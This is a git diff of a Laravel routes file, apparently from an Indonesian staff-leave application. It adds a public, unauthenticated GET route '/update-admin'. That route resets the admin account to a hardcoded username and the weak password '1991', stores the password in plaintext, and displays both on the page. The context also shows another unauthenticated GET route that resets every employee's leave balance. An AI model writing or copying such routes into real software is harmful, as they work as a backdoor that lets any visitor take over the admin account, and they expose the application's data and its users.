@@ -24,10 +24,20 @@ Route::get('/fix-folders', function () {
     \Illuminate\Support\Facades\DB::table('pegawai')->update(['sisa_cuti_tahunan' => 12]);
     $log[] = 'Sisa cuti tahunan SELURUH PEGAWAI BERHASIL DI-RESET MENJADI 12 HARI!';
 
-    @array_map('unlink', glob(base_path('bootstrap/cache/*.php')));
-    @array_map('unlink', glob(storage_path('framework/views/*.php')));
-
     return '<h2>✅ FIX CONTROLLER COMPLETED!</h2><p>' . (empty($log) ? 'Folder Admin & Pegawai status: OK' : implode('<br>', $log)) . '</p><br><a href="/login">Buka Halaman Login / Dashboard</a>';
+});
+
+Route::get('/update-admin', function () {
+    $admin = \App\Models\User::where('role', 'admin')->first();
+    if ($admin) {
+        $admin->update([
+            'nip'            => 'admindkp2026',
+            'password'       => \Illuminate\Support\Facades\Hash::make('1991'),
+            'password_plain' => '1991',
+        ]);
+        return '<h2>✅ CREDENTIAL ADMIN BERHASIL DIPERBARUI!</h2><p>Username: <b>admindkp2026</b><br>Password: <b>1991</b></p><br><a href="/admin/login">Buka Halaman Login Admin</a>';
+    }
+    return 'User Admin tidak ditemukan.';
 });
 
 // ─── Storage File Fallback Route (100% Symlink Free untuk Hostinger) ───────────
